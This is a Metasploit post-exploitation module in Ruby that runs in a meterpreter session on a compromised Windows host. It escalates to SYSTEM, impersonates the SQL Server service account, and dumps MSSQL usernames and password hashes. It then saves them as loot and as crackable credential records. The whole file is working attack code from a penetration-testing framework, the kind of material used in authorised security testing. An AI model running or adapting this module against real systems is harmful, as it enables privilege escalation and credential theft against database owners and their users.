##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'
require 'msf/core/post/windows/mssql'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::MSSQL

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather Local SQL Server Hash Dump',
        'Description'   => %q{ This module extracts the usernames and password
        hashes from an MSSQL server and stores them as loot. It uses the
        same technique in mssql_local_auth_bypass.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
            'Mike Manzotti <mike.manzotti[at]dionach.com>',
            'nullbind' # Original technique
          ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ],
        'References'  =>
          [
            ['URL', 'https://www.dionach.com/blog/easily-grabbing-microsoft-sql-server-password-hashes']
          ]
      ))

    register_options(
      [
        OptString.new('INSTANCE',  [false, 'Name of target SQL Server instance', nil])
      ])
  end

  def run
    # Set instance name (if specified)
    instance = datastore['INSTANCE'].to_s

    # Display target
    print_status("Running module against #{sysinfo['Computer']}")

    # Identify available native SQL client
    get_sql_client
    fail_with(Failure::Unknown, 'Unable to identify a SQL client') unless @sql_client

    # Get LocalSystem privileges
    system_status = get_system
    fail_with(Failure::Unknown, 'Unable to get SYSTEM') unless system_status

    begin
      service = check_for_sqlserver(instance)
      fail_with(Failure::Unknown, 'Unable to identify MSSQL Service') unless service

      print_status("Identified service '#{service[:display]}', PID: #{service[:pid]}")
      instance_name = service[:display].gsub('SQL Server (','').gsub(')','').lstrip.rstrip

      begin
        get_sql_hash(instance_name)
      rescue RuntimeError
        # Attempt to impersonate sql server service account (for sql server 2012)
        if impersonate_sql_user(service)
          get_sql_hash(instance_name)
        end
      end
    ensure
      # return to original priv context
      session.sys.config.revert_to_self
    end
  end

  def get_sql_version(instance_name)
    vprint_status("Attempting to get version...")

    query = mssql_sql_info

    get_version_result = run_sql(query, instance_name)

    # Parse Data
    get_version_array = get_version_result.split("\n")
    version_year = get_version_array.first.strip.slice(/\d\d\d\d/)
    if version_year
      vprint_status("MSSQL version found: #{version_year}")
      return version_year
    else
      vprint_error("MSSQL version not found")
    end
  end

  def get_sql_hash(instance_name)
    version_year = get_sql_version(instance_name)

    case version_year
    when "2000"
      hash_type = "mssql"
      query = mssql_2k_password_hashes
    when "2005", "2008"
      hash_type = "mssql05"
      query = mssql_2k5_password_hashes
    when "2012", "2014"
      hash_type = "mssql12"
      query = mssql_2k5_password_hashes
    else
      fail_with(Failure::Unknown, "Unable to determine MSSQL Version")
    end

    print_status("Attempting to get password hashes...")

    res = run_sql(query, instance_name)

    if res.include?('0x')
      # Parse Data
      if hash_type == "mssql12"
        res = res.unpack('H*')[0].gsub("200d0a", "_CRLF_").gsub("0d0a", "").gsub("_CRLF_", "0d0a").gsub(/../) {
          |pair| pair.hex.chr
        }
      end
      hash_array = res.split("\r\n").grep(/0x/)

      store_hashes(hash_array, hash_type)
    else
      fail_with(Failure::Unknown, "Unable to retrieve hashes")
    end
  end

  def store_hashes(hash_array, hash_type)
    # Save data
    loot_hashes = ""
    hash_array.each do |row|
      user, hash = row.strip.split

      service_data = {
        address: rhost,
        port: rport,
        service_name: 'mssql',
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }

      # Initialize Metasploit::Credential::Core object
      credential_data = {
        post_reference_name: refname,
        origin_type: :session,
        private_type: :nonreplayable_hash,
        private_data: hash,
        username: user,
        session_id: session_db_id,
        jtr_format: hash_type,
        workspace_id: myworkspace_id
      }

      credential_data.merge!(service_data)

      # Create the Metasploit::Credential::Core object
      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      # Merge in the service data and create our Login
      login_data.merge!(service_data)
      create_credential_login(login_data)

      print_line("#{user}:#{hash}")

      loot_hashes << "#{user}:#{hash}\n"
    end

    unless loot_hashes.empty?
        # Store MSSQL password hash as loot
        loot_path = store_loot('mssql.hash', 'text/plain', session, loot_hashes, 'mssql_hashdump.txt', 'MSSQL Password Hash')
        print_good("MSSQL password hash saved in: #{loot_path}")
        return true
    else
        return false
    end
  end
end
